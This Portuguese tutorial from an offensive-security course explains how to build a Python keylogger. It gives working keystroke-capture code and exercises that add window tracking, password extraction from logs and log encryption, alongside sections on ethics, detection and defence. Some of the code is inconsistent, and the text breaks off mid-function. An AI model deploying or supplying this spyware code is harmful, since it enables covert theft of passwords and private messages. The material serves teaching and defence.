# 📚 Tutorial Didático - Keylogger em Python
## Curso de Simulação de Segurança Ofensiva

## Índice Completo
1. [Introdução ao Curso](#introdução-ao-curso)
2. [Contexto de Segurança](#contexto-de-segurança)
3. [Exemplos de Malware](#exemplos-de-malware)
4. [O que é um Keylogger?](#o-que-é-um-keylogger)
5. [Construindo o Ambiente](#construindo-o-ambiente)
6. [Parte 1: Importações](#parte-1-importações)
7. [Parte 2: Configuração do Logging](#parte-2-configuração-do-logging)
8. [Parte 3: Função on_press](#parte-3-função-on_press)
9. [Parte 4: Função on_release](#parte-4-função-on_release)
10. [Parte 5: Main e Listener](#parte-5-main-e-listener)
11. [Como Tudo Funciona Junto](#como-tudo-funciona-junto)
12. [Análise de Segurança](#análise-de-segurança)
13. [Como se Proteger](#como-se-proteger)
14. [Considerações Éticas](#considerações-éticas)

---

## Introdução ao Curso

Bem-vindo ao **Curso de Simulação de Segurança Ofensiva**! 

Este é um ambiente **educacional e controlado** para você entender como ataques de segurança funcionam por dentro. O objetivo é:

🎓 **Aprender** como hackers exploram vulnerabilidades  
🛡️ **Entender** como se defender melhor  
⚖️ **Reconhecer** o impacto de ataques maliciosos  
🔒 **Aplicar** conhecimento de forma ética e responsável  

### ⚠️ IMPORTANTE: Uso Responsável

```
Este conhecimento deve ser usado APENAS para:
✅ Fins educacionais e de pesquisa
✅ Ambientes de teste controlados (seu próprio PC)
✅ Pentesting autorizado em empresas
✅ Melhorar defesas de segurança

NUNCA use para:
❌ Atacar sistemas de terceiros
❌ Roubar informações sem autorização
❌ Fins criminosos
❌ Prejudicar usuários inocentes
```

### O que você vai aprender neste módulo:
- ✅ Como funcionam keyloggers internamente
- ✅ Captura de eventos do teclado em Python
- ✅ Logging e armazenamento de dados
- ✅ Tratamento de exceções e casos especiais
- ✅ Análise de código malicioso
- ✅ Defesas e proteções

---

## Contexto de Segurança

### A Pirâmide do Ataque

```
                  ┌─────────────────┐
                  │   Objetivo      │
                  │  (Dados/Acesso) │
                  └────────┬────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
    ┌───▼────┐        ┌────▼─────┐      ┌────▼─────┐
    │Malware │        │Phishing  │      │Exploits  │
    │(vírus) │        │(enganar) │      │(bugs)    │
    └───┬────┘        └────┬─────┘      └────┬─────┘
        │                  │                  │
        └──────────────────┼──────────────────┘
                           │
                    ┌──────▼───────┐
                    │ Infiltração  │
                    │ (estar dentro)│
                    └──────┬───────┘
                           │
                    ┌──────▼──────────┐
                    │  Manutenção     │
                    │  (permanecer)   │
                    └──────┬──────────┘
                           │
                  ┌────────▼────────┐
                  │Exfiltração      │
                  │(roubar dados)   │
                  └─────────────────┘
```

**Keyloggers aparecem na fase de:**
- **Infiltração**: O atacante precisa estar no PC
- **Manutenção**: Continua funcionando sem ser detectado
- **Exfiltração**: Coleta dados sensíveis (senhas, mensagens, etc.)

---

## Exemplos de Malware

### Tipos principais de malware:

| Tipo | O que faz | Exemplo | Impacto |
|------|-----------|---------|--------|
| **Vírus** | Se copia e infecta outros arquivos | ILOVEYOU (2000) | Destruição de dados |
| **Worm** | Se copia automaticamente pela rede | Morris Worm (1988) | Lentidão e travamentos |
| **Ransomware** | Criptografa arquivos e pede resgate | WannaCry (2017) | Perda de dados/dinheiro |
| **Trojan** | Parece legítimo mas faz o oposto | Backdoor | Acesso remoto não autorizado |
| **Spyware** | Espiona atividades do usuário | Keylogger, traqueador | Roubo de dados pessoais |
| **Rootkit** | Se esconde profundamente no sistema | Stuxnet (2010) | Controle total do PC |
| **Botnet** | Transforma PCs em zumbis | Mirai | Ataque DDoS em massa |

### Onde o Keylogger se encaixa?

Um keylogger é um tipo de **spyware** que:
- ✅ Captura tudo o que você digita
- ✅ Se esconde do usuário
- ✅ Envia dados para atacante
- ✅ Rouba senhas, mensagens, dados bancários

### Ciclo de ataque com Keylogger:

```
1. Infiltração → Keylogger é instalado no PC
2. Execução → Começa a capturar teclado
3. Captura → Armazena tudo em arquivo
4. Exfiltração → Envia dados ao atacante
5. Análise → Atacante busca senhas, dados sensíveis
6. Exploração → Usa as informações roubadas
```

---

## O que é um Keylogger?

### Definição Formal

Um **keylogger** é uma ferramenta (software ou hardware) que:
- Captura eventos do teclado
- Registra tudo o que é digitado
- Armazena as informações
- Pode enviar dados remotamente

### Tipos de Keylogger

#### 1️⃣ **Keylogger por Software**
```python
# Este é um keylogger de software
from pynput import keyboard  # Monitora eventos do OS

def on_press(key):
    # Captura todas as teclas digitadas
    print(f"Tecla pressionada: {key}")
```

**Vantagens:**
- Fácil de instalar e usar
- Funciona em qualquer PC com Python
- Pode se esconder facilmente

**Desvantagens:**
- Pode ser detectado por antivírus
- Usa recursos do sistema
- Requer acesso ao PC

#### 2️⃣ **Keylogger por Hardware**
```
Teclado → [DISPOSITIVO] → PC
         (gravador USB)
```

**Características:**
- Dispositivo físico entre teclado e PC
- Invisível ao software
- Difícil de detectar
- Armazena em memória interna

#### 3️⃣ **Keylogger em Kernel**
```
Nível do Sistema Operacional
↓
Intercepta eventos ANTES do aplicativo
↓
Muito mais perigoso
↓
Requer acesso de administrador
```

### O que um Keylogger pode capturar?

```
┌─────────────────────────────────────┐
│     DADOS SENSÍVEIS CAPTURADOS      │
├─────────────────────────────────────┤
│ ✗ Senhas (bancos, emails, redes)    │
│ ✗ Mensagens privadas (WhatsApp)     │
│ ✗ Números de cartão de crédito      │
│ ✗ Dados de CPF/Passport             │
│ ✗ Mensagens e conversas             │
│ ✗ Histórico de navegação            │
│ ✗ Documentos digitados              │
│ ✗ Códigos de autenticação           │
└─────────────────────────────────────┘
```

---

## Construindo o Ambiente

Antes de criar um keylogger, você precisa preparar seu ambiente.

### Pré-requisitos

1. **Python 3.8 ou superior**
```bash
python --version  # Verificar versão
```

2. **Pip (gerenciador de pacotes)**
```bash
pip --version
```

3. **Bibliotecas necessárias**
```bash
pip install pynput
```

### Estrutura do Projeto

```
KEYLOGGER/
├── keylogger.py          # Script principal
├── keys.log              # Arquivo de log (gerado)
├── requirements.txt      # Dependências
├── teste.py              # Script de teste
├── TUTORIAL.md           # Este arquivo
└── README.md             # Documentação
```

### Arquivo requirements.txt

Crie um arquivo `requirements.txt` com:
```
pynput==1.7.6
```

Depois instale tudo de uma vez:
```bash
pip install -r requirements.txt
```

### Ambiente Seguro

⚠️ **IMPORTANTE**: Use uma máquina virtual!

```
Seu PC (real)
    ↓
    └─→ VirtualBox/VMware
        └─→ Windows/Linux Virtual
            └─→ Instale Python lá
                └─→ Teste scripts AQUI
```

**Por que?**
- ✅ Isolamento total
- ✅ Sem risco ao PC real
- ✅ Fácil resetar se algo der errado
- ✅ Ambiente controlado e educacional

---

## Parte 1: Importações

```python
from pynput import keyboard
```

### O que é isso?

**Importação** significa: "trazer uma biblioteca para dentro do seu código".

A biblioteca `pynput` é uma ferramenta do Python que permite:
- 🎹 Capturar o que você digita no teclado
- 🖱️ Capturar movimento do mouse
- 🎯 Simular cliques e digitações

### Como funciona:

```
pynput (biblioteca grande)
└── keyboard (módulo específico para teclado)
    ├── Listener (ouve as teclas)
    ├── Key (representa as teclas especiais)
    └── Controller (controla o teclado)
```

### Analogia:

Pense em uma biblioteca de verdade:
- `pynput` = biblioteca inteira
- `keyboard` = seção específica (Ficção, Técnica, etc.)
- `Listener` = um livro específico que você pega da prateleira

---

## Parte 2: Configuração do Logging

```python
LOG_FILE = "keys.log"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
```

### Linha 1: Definindo o arquivo
```python
LOG_FILE = "keys.log"
```
- Cria uma **variável** chamada `LOG_FILE`
- Essa variável armazena o nome do arquivo onde tudo será gravado
- Se fosse outro nome: `"meu_arquivo.txt"`, `"teclas.log"`, etc.

### Linhas 3-7: Configurando o logging

```python
logging.basicConfig(...)
```

Isso configura **COMO** as mensagens serão gravadas. Vamos entender cada linha:

| Parâmetro | O que faz | Exemplo |
|-----------|----------|---------|
| `filename=LOG_FILE` | Especifica o arquivo de saída | `"keys.log"` |
| `level=logging.INFO` | Nível de severidade das mensagens | INFO, WARNING, ERROR, etc. |
| `format="%(asctime)s %(message)s"` | Formato da mensagem (data + mensagem) | `2026-08-13 14:30:45 Key pressed: a` |
| `datefmt="%Y-%m-%d %H:%M:%S"` | Formato da data/hora | Ano-Mês-Dia Hora:Minuto:Segundo |

### Resultado visual:

Quando você digita `"ola"`, o arquivo `keys.log` fica assim:

```
2026-08-13 14:30:45 Key pressed: o
2026-08-13 14:30:46 Key pressed: l
2026-08-13 14:30:47 Key pressed: a
```

---

## Parte 3: Função on_press

Esta é a **parte mais importante**. É chamada toda vez que você **pressiona uma tecla**.

```python
def on_press(key):
    try:
        # Tenta capturar o caractere da tecla
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Se for uma tecla especial (sem caractere)
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
```

### Entendendo a estrutura

#### A linha principal:
```python
def on_press(key):
```

- `def` = "definir uma função"
- `on_press` = nome da função
- `key` = parâmetro (a tecla pressionada)

Toda vez que você pressiona uma tecla, Python chama essa função automaticamente e passa a tecla como parâmetro.

#### Bloco TRY (tentativa):
```python
try:
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key.char)
```

**O que faz:**
1. `try:` = "tenta fazer isto"
2. `open("log.txt", "a")` = abre o arquivo em modo **append** (adicionar)
   - `"a"` = append (adiciona ao final, não sobrescreve)
   - `"w"` = write (sobrescreve)
   - `"r"` = read (lê)
3. `as f:` = apelida o arquivo como `f`
4. `f.write(key.char)` = escreve o caractere no arquivo
   - `key.char` = o caractere da tecla (ex: "a", "5", "@")

**Exemplo:**
```
Você digita: a b c
Arquivo fica: abc
```

#### Bloco EXCEPT (exceção):
```python
except AttributeError:
    # Se for uma tecla especial (sem caractere)
    with open("log.txt", "a", encoding="utf-8") as f:
        if key == keyboard.Key.space:
            f.write(" ")
```

**Por que existe?**

Nem toda tecla tem um `.char` (caractere). Por exemplo:
- Shift não é um caractere
- Ctrl não é um caractere
- Espaço é especial
- Enter é especial

Se você tentar acessar `.char` em uma tecla que não tem, Python gera um erro chamado `AttributeError`.

**O EXCEPT captura esse erro e:**
1. Abre o arquivo
2. Verifica qual tecla especial foi pressionada
3. Grava o símbolo correspondente

#### Comparação das teclas especiais:

| Tecla | Código | Resultado no arquivo |
|-------|--------|----------------------|
| Espaço | `keyboard.Key.space` | ` ` (um espaço) |
| Enter | `keyboard.Key.enter` | `\n` (quebra de linha) |
| Tab | `keyboard.Key.tab` | `\t` (tabulação) |
| Backspace | `keyboard.Key.backspace` | ` ` (espaço) |
| ESC | `keyboard.Key.esc` | `[ESC]` (texto) |

#### Teclas Ignoradas:
```python
elif key in IGNORAR:
    pass
```

Lembra do `IGNORAR` lá no começo do arquivo? É uma lista de teclas que não queremos registrar:

```python
IGNORAR = [
    keyboard.Key.shift,      # Shift esquerdo
    keyboard.Key.shift_r,    # Shift direito
    keyboard.Key.ctrl_l,     # Ctrl esquerdo
    keyboard.Key.ctrl_r,     # Ctrl direito
    keyboard.Key.alt_l,      # Alt esquerdo
    keyboard.Key.alt_r,      # Alt direito
    keyboard.Key.caps_lock,  # Caps Lock
    keyboard.Key.cmd,        # Tecla Windows/Comando
]
```

**Por que ignorar?**
- Essas teclas não têm conteúdo próprio
- Elas modificam outras teclas (Shift + a = A)
- Não faz sentido registrá-las

**O que faz `pass`?**
```python
pass
```
Significa: "não faz nada". É como um vazio proposital.

#### Catch-all (pega tudo o mais):
```python
else:
    f.write(f"[{key}]")
```

Se a tecla não é nenhuma das anteriores, grava entre colchetes.

**Exemplo:**
- Você digita as setas do teclado: `[Key.up]`, `[Key.down]`
- Você digita Page Up: `[Key.page_up]`
- Você digita teclas de função: `[Key.f1]`, `[Key.f2]`

---

## Parte 4: Função on_release

```python
def on_release(key):
    if key == keyboard.Key.esc:
        return False
```

### O que faz?

Esta função é chamada quando você **SOLTA uma tecla**.

- `def on_release(key):` = define a função
- `if key == keyboard.Key.esc:` = se a tecla for ESC
- `return False` = **para de escutar o teclado**

### Por que False?

No `pynput`, quando o listener retorna `False`, ele **para de funcionar**. É a forma de desligar o keylogger.

**Analogia:** 
```
Listener = rádio ligado
Return False = desligar o rádio
```

---

## Parte 5: Main e Listener

```python
if __name__ == "__main__":
    print(f"Keylogger started. Logs will be saved to {LOG_FILE}")
    print("Press ESC to stop.")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
```

### A linha if __name__ == "__main__":

```python
if __name__ == "__main__":
```

Significa: "execute isto **apenas** se eu rodei este arquivo diretamente (não se importei de outro arquivo)"

### Print (exibição):

```python
print(f"Keylogger started. Logs will be saved to {LOG_FILE}")
```

O `f` antes das aspas significa **f-string** (string formatada):
- `{LOG_FILE}` é substituído pelo valor da variável
- Se `LOG_FILE = "keys.log"`, a mensagem fica: `Keylogger started. Logs will be saved to keys.log`

### O Listener:

```python
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

**Quebrando em partes:**

1. `keyboard.Listener(...)` = cria um "ouvinte" do teclado
   - `on_press=on_press` = chamar a função `on_press()` quando pressiona
   - `on_release=on_release` = chamar `on_release()` quando solta

2. `as listener:` = apelida o listener como `listener`

3. `listener.join()` = **espera o listener terminar**
   - Mantém o programa rodando
   - Aguarda eventos do teclado
   - Quando `on_release` retorna `False`, o listener para

**Fluxo:**
```
Programa inicia
    ↓
Cria um Listener
    ↓
Aguarda (listener.join())
    ↓
Você digita → on_press é chamado
Você solta → on_release é chamado
    ↓
Você aperta ESC → on_release retorna False
    ↓
Listener para
    ↓
Programa termina
```

---

## Como Tudo Funciona Junto

Vamos simular um exemplo real:

### Cenário: Você digita "Oi"

1. **Você pressiona 'O'**
   - `on_press()` é chamado com `key = 'O'`
   - Tenta `key.char` → funciona
   - Escreve "O" no arquivo
   - Arquivo: `O`

2. **Você solta 'O'**
   - `on_release()` é chamado com `key = 'O'`
   - Não é ESC → não faz nada

3. **Você pressiona 'i'**
   - `on_press()` é chamado com `key = 'i'`
   - Tenta `key.char` → funciona
   - Escreve "i" no arquivo
   - Arquivo: `Oi`

4. **Você solta 'i'**
   - `on_release()` é chamado com `key = 'i'`
   - Não é ESC → não faz nada

5. **Você pressiona ESC para parar**
   - `on_press()` é chamado com `key = ESC`
   - Tenta `key.char` → erro (ESC não tem caractere)
   - Vai para except
   - `key == keyboard.Key.esc` → True
   - Escreve `[ESC]` no arquivo
   - Arquivo: `Oi[ESC]`

6. **Você solta ESC**
   - `on_release()` é chamado com `key = ESC`
   - `key == keyboard.Key.esc` → True
   - `return False` → para de escutar
   - Listener fecha
   - Programa termina

### Arquivo final:
```
Oi[ESC]
```

---

## Diagrama Completo

```
┌─────────────────────────────────────┐
│  Programa começa                    │
│  Cria Listener do teclado          │
│  Mostra mensagens                  │
└─────────────────────┬───────────────┘
                      │
                      ↓
        ┌─────────────────────────┐
        │  Aguardando entrada...  │
        │  (listener.join())      │
        └─────────────┬───────────┘
                      │
          ┌───────────┴───────────┐
          ↓                       ↓
    ┌──────────────┐      ┌──────────────┐
    │  Tecla       │      │  Tecla       │
    │  pressionada │      │  solta       │
    │              │      │              │
    │ on_press()   │      │ on_release() │
    │ registra     │      │ verifica ESC │
    └──────────────┘      └──────────────┘
                      ↑
                      │
              ┌───────┴────────┐
              │ É ESC?         │
              ├────┬───────────┤
              │Não │    Sim    │
              ↓    │           ↓
           Loop   │    return False
                  │           │
                  └───────────┘
                          ↓
                  ┌───────────────────┐
                  │ Listener para     │
                  │ Programa termina  │
                  └───────────────────┘
```

---

---

## Análise de Segurança

### Análise dos Códigos das Funções

Agora que você entende como o keylogger funciona, vamos analisar **por que** ele é perigoso.

#### Análise da Função `on_press()`:

```python
def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Trata teclas especiais
```

**Problemas de Segurança:**

| Problema | Risco | Impacto |
|----------|-------|--------|
| Sem encriptação | Arquivo em texto plano | Qualquer pessoa pode ler |
| Local no disco | Antivírus pode encontrar | Fácil detecção |
| Sem compressão | Arquivo cresce muito | Usa espaço em disco |
| Sem limite | Captura TUDO indefinidamente | Dados pessoais de meses |
| Sem filtro inteligente | Captura senhas completas | Roubo direto de credenciais |

#### Análise da Função `on_release()`:

```python
def on_release(key):
    if key == keyboard.Key.esc:
        return False
```

**Problemas de Segurança:**

1. **Parar muito fácil**: Tecla ESC desliga tudo
   - ❌ Versão real seria **impossível de parar**
   - ❌ Se esconderia do controle do usuário

2. **Sem persistência**: Não sobrevive a reinicializações
   - ❌ Versão real se adicionaria ao startup
   - ❌ Rodaria toda vez que o PC liga

### Como Versões Reais são Mais Perigosas

#### Nossa Versão (Educacional):
```python
# Fácil de ver
keys.log no disco
# Fácil de parar
Aperta ESC
# Fácil de remover
Delete o arquivo .py
```

#### Versão Real (Maliciosa):
```python
# Invisível
❌ Escondida em:
   - Pasta do Windows (C:\Windows\System32\)
   - Nomes aleatórios
   - Registrado no Regedit
   - Criptografado

# Impossível de parar
❌ Rodando com acesso de kernel
❌ Se reinicia automaticamente
❌ Se multiplica para outros PCs
❌ Bloqueia tentativas de desinstalação

# Exfiltração automática
❌ Envia dados via:
   - Conexões HTTPS (cifradas)
   - Múltiplos servidores
   - Protocolos escondidos
   - Sem deixar rastros

# Evasão de antivírus
❌ Usa técnicas como:
   - Ofuscação de código
   - Injeção de processo
   - Rootkit (nível kernel)
   - Polimorfismo (muda constantemente)
```

### Indicadores de Comprometimento (IoCs)

Se você quer **detectar** um keylogger, procure por:

| Indicador | O que procurar | Comando |
|-----------|---|---|
| **Processos estranhos** | Nomes aleatórios rodando | `tasklist` |
| **Conexões de rede** | IP/porta desconhecida | `netstat -an` |
| **Arquivos ocultos** | Em `AppData`, Temp, etc. | `dir /a` |
| **Registro alterado** | Startup automático | `regedit` |
| **CPU/Memória alta** | Uso anormal | Gerenciador de tarefas |
| **Disco sendo escrito** | Atividade constante | Monitor de disco |

---

## Como se Proteger?

### 1️⃣ Proteção Técnica

#### Antivírus e Antimalware
```
Camadas de defesa:

Nível 1: Antivírus em Tempo Real
  └─→ Windows Defender (builtin)
  └─→ Kaspersky, Norton, Avast

Nível 2: Antimalware Específico
  └─→ Malwarebytes
  └─→ ESET

Nível 3: Firewall
  └─→ Windows Firewall
  └─→ ZoneAlarm, Comodo

Nível 4: Monitoramento Comportamental
  └─→ Detecção de anomalias
  └─→ Sandboxing
```

#### Boas Práticas de Segurança

```python
# ✅ FAZER:

1. Manter Windows atualizado
   - Patches críticos de segurança
   - Driver updates
   
2. Usar senhas fortes
   - Mínimo 12 caracteres
   - Letras + números + símbolos
   - Únicas por serviço

3. Autenticação em dois fatores (2FA)
   - Google Authenticator
   - SMS, Email
   - Biometria

4. Navegação segura
   - HTTPS (cadeado)
   - Sites confiáveis
   - Não clicar em links suspeitos

# ❌ NÃO FAZER:

1. Baixar arquivos de sites aleatórios
2. Abrir attachments de emails desconhecidos
3. Usar senhas simples ou repetidas
4. Conectar em WiFi público sem VPN
5. Desabilitar antivírus
6. Compartilhar credenciais
```

### 2️⃣ Proteção Comportamental

#### Sinais de Alerta

```
🚨 CUIDADO COM:

- Email de empresa pedindo senha/2FA
  → Phishing! Empresa NUNCA pede
  
- Anexo de ".exe" ou ".zip"
  → Pode conter malware
  
- Pop-up dizendo "seu PC está infectado"
  → Scareware (golpe psicológico)
  
- Site com URL ligeiramente diferente
  → Homograph attack
  → "amaz0n.com" em vez de "amazon.com"
  
- Programa pedindo acesso de admin
  → Por que precisa?
  → Verifique legitimidade
```

#### Checklist de Segurança Pessoal

```
[ ] Sistema operacional atualizado
[ ] Antivírus ativo e com definições recentes
[ ] Passwords únicas e fortes
[ ] 2FA habilitado em contas importantes
[ ] Não compartilho credenciais
[ ] Não abro links de pessoas desconhecidas
[ ] Verifiquei emails antes de clicar
[ ] Backups regulares dos dados importantes
[ ] VPN ativa em WiFi público
[ ] Verifico certificados SSL (HTTPS)
```

### 3️⃣ Ferramentas de Proteção

#### Monitor de Teclado (Contra-Medida)

Você pode criar um monitor que **detecta** keyloggers:

```python
# Pseudocódigo de detector de keylogger

def detectar_keylogger():
    """Verifica indicadores de keylogger"""
    
    problemas = []
    
    # Verifica processos estranhos
    processos = os.popen('tasklist').read()
    if 'suspicious.exe' in processos:
        problemas.append("Processo suspeito detectado")
    
    # Verifica conexões de rede
    conexoes = os.popen('netstat -an').read()
    if '123.456.789.0' in conexoes:  # IP suspeito
        problemas.append("Conexão para IP desconhecido")
    
    # Verifica registros do Windows
    # ...
    
    if problemas:
        print("⚠️ POSSÍVEL KEYLOGGER DETECTADO!")
        for p in problemas:
            print(f"  - {p}")
    else:
        print("✅ Sistema limpo")
```

#### Ferramentas Recomendadas

| Ferramenta | Uso | Grátis? |
|-----------|-----|--------|
| Windows Defender | Antivírus | ✅ |
| Malwarebytes | Detecção malware | ✅ (limitado) |
| Wireshark | Análise de rede | ✅ |
| Process Explorer | Monitor de processos | ✅ |
| Autoruns | Startup programs | ✅ |
| HijackThis | Verificar sistema | ✅ |

---

## Considerações Éticas

### A Responsabilidade do Conhecimento

Saber como criar um keylogger é uma **grande responsabilidade**.

```
         Conhecimento
              │
    ┌─────────┴──────────┐
    │                    │
 Uso Ético           Uso Antiético
    │                    │
    ↓                    ↓
Defesa              Ataque
Pesquisa            Crime
Educação            Prejuízo
```

### Leis e Regulações

#### No Brasil (e maioria dos países):

```
CRIME usar keylogger para:
- Roubar informações pessoais
- Acessar contas alheias
- Espionar pessoas
- Fraude financeira

Lei aplicável:
- Lei de Acesso a Computadores (12.965/14)
- Lei Geral de Proteção de Dados (LGPD)
- Código Penal (artigos 154, 286, 307)

Penas:
- Multa pesada
- Prisão de 3 a 8 anos
- Indenização às vítimas
```

#### Uso Legal:

```
✅ PERMITIDO com:
- Autorização explícita do proprietário
- Ambiente controlado (seu PC)
- Fins educacionais e de pesquisa
- Pentesting contratado (documento assinado)
- Análise de segurança própria
```

### Código de Ética para Pesquisadores

Se você quer usar este conhecimento profissionalmente:

```
1. SEMPRE obter autorização por escrito
   └─→ Email, contrato, tudo documentado

2. NUNCA acessar dados sem permissão
   └─→ Scope bem definido

3. REPORTAR vulnerabilidades responsavelmente
   └─→ Não publicar antes de fix

4. PROTEGER dados encontrados
   └─→ Sigilo profissional

5. EDUCAR, não prejudicar
   └─→ Ajudar empresas a melhorar defesas

6. SEGUIR regulações
   └─→ GDPR, LGPD, leis locais
```

### Cenários Éticos vs Antiéticos

#### ✅ ÉTICO:

```
Cenário 1: Teste seu próprio PC
- Você: Proprietário
- Ambiente: Seu PC
- Objetivo: Aprender
- Risco: Zero para terceiros

Cenário 2: Pentesting autorizado
- Cliente: Contratante
- Contrato: Assinado
- Escopo: Bem definido
- Pagamento: Acordado

Cenário 3: Pesquisa acadêmica
- Universidade: Aprovação ética
- IRB: Revisão
- Publicação: Responsável
```

#### ❌ ANTIÉTICO:

```
Cenário 1: Espiões amigo/cônjuge
- Violação de privacidade
- Quebra de confiança
- Possível crime

Cenário 2: Empresa sem autorização
- Roubo de propriedade intelectual
- Espionagem corporativa
- Crime federal

Cenário 3: Banco/Governo
- Roubo de identidade
- Fraude financeira
- Terrorismo digital
```

---

## Resumo Educacional

### O Keylogger na Pirâmide de Aprendizado

```
        Segurança Defensiva
              ↑
              │
    Análise de Malware
         ↑    │
         │    ↓
Detecção de Ataques
         ↑    │
         │    ↓
    Conhecimento de Ataques
         ↑    │
         │    ↓
      Você (Estudando Keylogger)
```

### Conceitos Aprendidos

| Conceito | O que significa | Aplicação |
|----------|---|---|
| **Importar** | Trazer uma biblioteca | Usar `pynput` |
| **Logging** | Gravar em arquivo | `logging.basicConfig()` |
| **Event-Driven** | Código que reage a eventos | `on_press`, `on_release` |
| **Try/Except** | Lidar com erros | Teclas normais vs especiais |
| **Callback** | Função chamada automaticamente | Listener chama função |
| **Listener** | Ouve eventos do sistema | `keyboard.Listener()` |
| **Threads** | Execução simultânea | Captura enquanto programa roda |
| **Detecção** | Identificar anomalias | Verificar IoCs |
| **Defesa** | Proteção contra ataques | Antivírus, 2FA, comportamento |

---

## Próximos Passos no Curso

### Módulo Seguinte: Tornando Invisível

Após dominar os conceitos básicos, você aprenderá:

```
┌─────────────────────────────────────────┐
│   Ocultação e Persistência              │
├─────────────────────────────────────────┤
│ 1. Esconder processo no Gerenciador     │
│ 2. Adicionar ao startup automático      │
│ 3. Criptografar arquivo de log          │
│ 4. Usar nomes aleatórios                │
│ 5. Injetar em processo legítimo         │
│ 6. Ofuscar código                       │
└─────────────────────────────────────────┘
```

### Módulo Seguinte: Exfiltração Remota

```
┌─────────────────────────────────────────┐
│   Enviando Dados Remotamente            │
├─────────────────────────────────────────┤
│ 1. Servidor C2 (Command & Control)      │
│ 2. Envio via HTTPS                      │
│ 3. Compressão e criptografia            │
│ 4. Limpeza de rastros                   │
│ 5. Comunicação bidirecional             │
└─────────────────────────────────────────┘
```

### Contexto Maior: Ransomware

O keylogger é frequentemente o **primeiro passo** de um ataque ransomware:

```
1. Keylogger rouba senha de admin
           ↓
2. Atacante usa senha para acesso
           ↓
3. Propaga ransomware pela rede
           ↓
4. Criptografa todos os arquivos
           ↓
5. Pede resgate
```

---

## Exercícios Práticos Progressivos

### Nível 1: Iniciante (Conceitos Básicos)

#### 1.1 - Adicione a Data no Arquivo

**Objetivo:** Aprender a usar `datetime`

```python
from datetime import datetime

def on_press(key):
    try:
        data_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("log.txt", "a") as f:
            f.write(f"[{data_hora}] {key.char}\n")
    except AttributeError:
        pass
```

**O que aprendeu:**
- Importar e usar `datetime`
- String formatting com f-strings
- Adicionar contexto temporal aos eventos

#### 1.2 - Variável para Tecla de Parada

**Objetivo:** Deixar configurável qual tecla para o keylogger

```python
STOP_KEY = keyboard.Key.esc  # Mude para outra tecla

def on_release(key):
    if key == STOP_KEY:
        return False
```

**O que aprendeu:**
- Uso de constantes
- Flexibilidade no código
- Princípio DRY (Don't Repeat Yourself)

#### 1.3 - Contador de Teclas

**Objetivo:** Aprender a manter estado

```python
tecla_count = 0

def on_press(key):
    global tecla_count  # Usar variável global
    tecla_count += 1
    
    try:
        with open("log.txt", "a") as f:
            f.write(f"{tecla_count}: {key.char}\n")
    except AttributeError:
        pass

print(f"Total de {tecla_count} teclas pressionadas")
```

**O que aprendeu:**
- Variáveis globais
- Incremento de contadores
- Estatísticas simples

---

### Nível 2: Intermediário (Estruturas de Dados)

#### 2.1 - Salvar em Dicionário

**Objetivo:** Organizar dados em estrutura

```python
from datetime import datetime
from collections import defaultdict

keylog = defaultdict(list)

def on_press(key):
    try:
        char = key.char
        hora = datetime.now().strftime("%H:%M:%S")
        keylog[hora].append(char)
    except AttributeError:
        pass

# Salvar estrutura
import json
with open("log.json", "w") as f:
    json.dump(dict(keylog), f, indent=2)
```

**O que aprendeu:**
- Dicionários e listas
- JSON (formato de dados)
- Serialização de estruturas

#### 2.2 - Analisar Padrões

**Objetivo:** Extrair inteligência dos dados

```python
def analisar_log():
    """Encontra padrões nos dados capturados"""
    
    # Teclas mais frequentes
    from collections import Counter
    
    with open("log.txt", "r") as f:
        teclas = f.read()
    
    contador = Counter(teclas)
    print("Teclas mais frequentes:")
    for tecla, freq in contador.most_common(10):
        print(f"  {repr(tecla)}: {freq}x")
    
    # Tentativa de encontrar senhas
    if "password" in teclas.lower():
        print("⚠️ Palavra 'password' detectada!")
```

**O que aprendeu:**
- Análise de dados
- Counter (ferramenta útil)
- Detecção de padrões

#### 2.3 - Separar por Aplicativo

**Objetivo:** Saber qual aplicativo estava em foco

```python
import pygetwindow  # pip install pygetwindow

def get_active_window():
    """Obtém o nome da janela ativa"""
    try:
        return pygetwindow.getActiveWindow().title
    except:
        return "Unknown"

def on_press(key):
    try:
        janela = get_active_window()
        with open("log.txt", "a") as f:
            f.write(f"[{janela}] {key.char}\n")
    except AttributeError:
        pass
```

**O que aprendeu:**
- Integração com sistema operacional
- Obter contexto de aplicativos
- Aumentar sofisticação de captura

---

### Nível 3: Avançado (Defesa e Análise)

#### 3.1 - Detectar Padrões de Senha

**Objetivo:** Reconhecer quando senhas são digitadas

```python
def detectar_senha():
    """Identifica padrões que parecem senhas"""
    
    regex_patterns = [
        r"password[\s=:]+\S+",  # password=xxx
        r"senha[\s=:]+\S+",     # senha=xxx
        r"pin[\s=:]+\d{4,}",    # pin=1234
    ]
    
    with open("log.txt", "r") as f:
        conteudo = f.read()
    
    import re
    for pattern in regex_patterns:
        matches = re.findall(pattern, conteudo, re.IGNORECASE)
        if matches:
            print(f"⚠️ Potencial senha encontrada: {matches}")
```

**O que aprendeu:**
- Expressões regulares (regex)
- Análise forense
- Reconhecimento de padrões maliciosos

#### 3.2 - Encriptação do Log

**Objetivo:** Proteger dados capturados

```python
from cryptography.fernet import Fernet

# Gerar chave (SALVAR em local seguro!)
chave = Fernet.generate_key()

def on_press_encriptado(key):
    """Salva log encriptado"""
    try:
        cipher = Fernet(chave)
        mensagem = f"{key.char}".encode()
        criptografado = cipher.encrypt(mensagem)
        
        with open("log.enc", "ab") as f:
            f.write(criptografado + b"\n")
    except AttributeError:
        pass

# Para ler depois:
def ler_log_encriptado():
    cipher = Fernet(chave)
